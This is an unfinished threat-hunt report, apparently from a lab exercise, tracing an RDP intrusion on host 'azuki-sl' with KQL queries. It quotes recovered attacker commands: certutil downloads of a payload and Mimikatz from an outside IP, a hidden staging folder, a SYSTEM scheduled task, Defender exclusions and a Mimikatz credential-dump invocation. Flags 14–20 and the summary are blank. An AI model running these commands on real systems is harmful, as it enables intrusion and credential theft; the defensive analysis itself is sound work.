# 🕵️‍♂️ Threat Hunt Report: CF Azuki Import/Export
<img width="300" height="410" alt="Port-of-entry" src="https://github.com/user-attachments/assets/ad79de24-8cf9-4897-8556-ab8e8143930b" />


**Analyst:** Edward Campbell  
**Investigation Date:** 23-November-2025  
**Incident Date:** 19-November-2025  

## 🎯 EXECUTIVE SUMMARY

*Write this LAST - 3-5 sentences summarizing the entire incident*

**What Happened:**

---
## 🖥️ INCIDENT DETAILS
### **Timeline Overview**

- **First Malicious Activity:** 19 November 2025 18:36:18.503997Z
- **Last Observed Activity:** 22 November 2025 00:38:47.8327343Z
- **Total Duration:** 54 hours 2 minutes

### **Attack Overview**

- **Initial Access Method:** Remote Desktop Protocol
- **Compromised Account:** kenji.sato
- **Affected System:** azuki-sl
- **Attacker IP Address:** 88.97.178.12
  
## 🧬 MITRE ATT&CK Mapping (Attack Chain)

| Tactic | Technique ID | Description |
|-------|--------------|-------------|
| **Initial Access (TA0001)** | T1078.003 | The attacker gained access using valid local credentials via RDP. |
| **Execution (TA0002)** | T1059.001 | PowerShell was used to run the malicious script `wupdate.ps1`. |
| **Persistence (TA0003)** | T1053.005 | A Scheduled Task was created to run the malicious payload. |
| **Defense Evasion (TA0005)** | T1564.001 / T1036.008 / T1105 | Attacker used hidden directories, file-type masquerading, and abused `certutil.exe` to download tools. |
| **Discovery (TA0007)** | T1016 | `arp -a` and `ipconfig /all` used to enumerate local network configuration. |
| **Credential Access (TA0006)** | T1003.001 | Mimikatz was used for credential dumping. |
| **Lateral Movement (TA0008)** | T1021.001 | `mstsc.exe /V:<IP>` used to attempt RDP lateral movement. |
| **Collection (TA0009)** | T1560.001 | Data staged into `export-data.zip`. |
| **Command & Control (TA0011)** | T1071.001 | HTTPS (port 443) used for C2 to external IP. |
| **Exfiltration (TA0010)** | T1567 | Discord webhook used for data exfiltration. |
| **Impact (TA0040)** | T1136.001 | Backdoor account `support` created for persistent access. |



---




##  Flag 1 – Identify the source IP address of the Remote Desktop Protocol connection

**Finding**: The IP address `88.97.178.12` gained initial access to the VM `AZUKI-SL` at `2025-11-19T18:36:18.503997Z` via RDP by using valid user credentials. 

**Thoughts**: When creating the query, I filtered for only `Network` and `RemoteInteractive` logon types because these represent an RDP connection. I determined the IP was suspicious because it originates in the UK, which is not normal for business in Japan.

**KQL Query**:
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where LogonType has_any ("Network", "RemoteInteractive")
| order by Timestamp desc

```
<img width="1905" height="549" alt="question1" src="https://github.com/user-attachments/assets/094c2159-f40a-427d-ba24-be689a6b74a1" />


---
##  Flag 2 – Identify the user account that was compromised for initial access

**Finding**: The User account `kenji.sato` was used by the attacker.

**Notes**: This evidence can be found when running the query in Flag 1.

---

##  Flag 3 – Identify the command and argument used to enumerate network neighbours

**Finding**: The attacher used the `Arp.exe` and `Ipconfig / all` commands to identify lateral movement opportunities at `2025-11-19T19:04:01.773778Z`.

**Thoughts**:  When creating this query, I wanted to start with the most common commands that reveal local network devices.

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T18:36:18.503997Z) .. datetime(2025-11-19T21:36:18.503997Z))
| where ProcessCommandLine has_any ("arp", "net", "nbtstat", "count", "get")
| order by Timestamp desc

```
<img width="1879" height="643" alt="Q3" src="https://github.com/user-attachments/assets/62d2dcec-76af-42e1-afc3-54b398923ee6" />


---
##  Flag 4 – Identify the PRIMARY staging directory where malware was stored

**Finding**: PowerShell was used to create the folder `WindowsCache` at `2025-11-19T19:05:30.755805Z`. The folder was then hidden at `2025-11-19T19:05:33.7665036Z`.

**Folder Path:** `C:\ProgramData\WindowsCache`  
**Commands Found**:  `attrib.exe +h +s C:\ProgramData\WindowsCache`  
**Thoughts**: I initially went in looking for hidden directories, which is why I filtered for `attrib.exe` first. I then went back and filtered for the hidden folder to see how it was created.

**KQL Queries**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where FileName =~ "attrib.exe"
| order by Timestamp desc
```
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "WindowsCache"
| order by Timestamp desc

```
<img width="1892" height="476" alt="Q4" src="https://github.com/user-attachments/assets/406cb6b9-7070-4857-8fa3-91e1693c9bce" />

---

##  Flag 5 – How many file extensions were excluded from Windows Defender scanning

**Finding**: 3 file extensions `(.ps1, .bat, and .exe )`  were added to the registry `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions` at `2025-11-19T18:49:27.7301011Z`.

**KQL Query**:
```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where RegistryKey contains "Exclusions"

```
<img width="1871" height="542" alt="Q5" src="https://github.com/user-attachments/assets/22f24091-6a64-4503-bc5a-ea7316423768" />

---

##  Flag 6 – What temporary folder path was excluded from Windows Defender scanning

**Finding**:  The temp folder was excluded from Windows Defender at `2025-11-19T18:49:27.6830204Z`.  
**REG Value Name**: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`    
**REG Path**: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`


**KQL Query**:
```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where RegistryKey contains "Exclusions"

```

---
##  Flag 7 – Identify the Windows-native binary the attacker abused to download files

**Finding**: The attacker abused `certutil.exe` to download malicious content from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `svchost.exe`.  
**Time of Event**: `2025-11-19T19:07:01.032199Z`
**Command Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6[:]8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`


**KQL Query**:
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where FolderPath contains "WindowsCache"
| order by Timestamp desc
```
---

##  Flag 8 & 9 – Identify the name and executable path of the scheduled task created for persistence

**Finding**: The attacker created a scheduled task named "Windows Update Check" that would secretly execute the malicious payload `svchost.exe` daily at 02:00 under the SYSTEM account.  
**Time of Event**: `2025-11-19T19:07:46.9796512Z`    
**Command Used**: `schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f`


**KQL Query**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where FileName contains "schtasks.exe"

```

---
##  Flag 10 & 11 –  Identify the IP address and the destination port of the command and control server

**Finding**: A network connection was initiated by `svchost.exe` to external `IP 78.141.196.6` over `port 443` at `2025-11-19T19:11:04.1766386Z`.  
**Thoughts**: I wanted to check for network events that happened shortly after `svchost.exe` was downloaded. This explains my reasoning for the timestamp range in my query. 


**KQL Query**:
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T19:07:01.032199Z) .. datetime(2025-11-19T19:30:01.032199Z))

```
<img width="1873" height="415" alt="Q10" src="https://github.com/user-attachments/assets/a0be21a6-3921-46fd-9e70-aad9a5c24ced" />

---
##  Flag 12 & 13 – Identify the filename of the credential dumping tool and the module used to extract logon passwords

**Finding**: The attacker abused `certutil.exe` again to download the credential-harvesting tool `Mimikatz` from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `mm.exe` at `2025-11-19T19:07:22.8551193Z`. They then used the extraction module `sekurlsa::logonpasswords` to extract logon passwords from memory at `2025-11-19T19:08:26.2804285Z`.    
**Commands Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` and `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`

**KQL Queries**:
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where FolderPath contains "WindowsCache"
| order by Timestamp desc
```
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "mm.exe"

```
<img width="1473" height="645" alt="Q13" src="https://github.com/user-attachments/assets/760915b2-b760-45b1-98d7-54966640542d" />

---

##  Flag 14 – Identify the compressed archive filename used for data exfiltration

**Objective**: 

**Finding**:  

**KQL Query**:
```
```

**Notes:**

---

##  Flag 15 – Identify the cloud service used to exfiltrate stolen data

**Objective**: 

**Finding**:  

**KQL Query**:
```
```

**Notes:**
---
##  Flag 16 – Identify the first Windows event log cleared by the attacker

**Objective**: 

**Finding**:  

**KQL Query**:
```
```

**Notes:**

---
##  Flag 17 – Identify the backdoor account username created by the attacker

**Objective**: 

**Finding**:  

**KQL Query**:
```
```

**Notes:**
---

##  Flag 18 – Identify the PowerShell script file used to automate the attack chain

**Objective**: 

**Finding**:  

**KQL Query**:
```
```

**Notes:**

---
##  Flag 19 – What IP address was targeted for lateral movement

**Objective**: 

**Finding**:  

**KQL Query**:
```
```

**Notes:**

---

##  Flag 20 – Identify the remote access tool used for lateral movement

**Objective**: 

**Finding**:  

**KQL Query**:
```
```

**Notes:**
---

## **APPENDIX**

### **A. Key Indicators of Compromise (IOCs)**
**B. MITRE ATT&CK Mapping**
**C. Investigation Timeline**
---

**Report Completed By:** Edward Campbell

**Date:** ________________
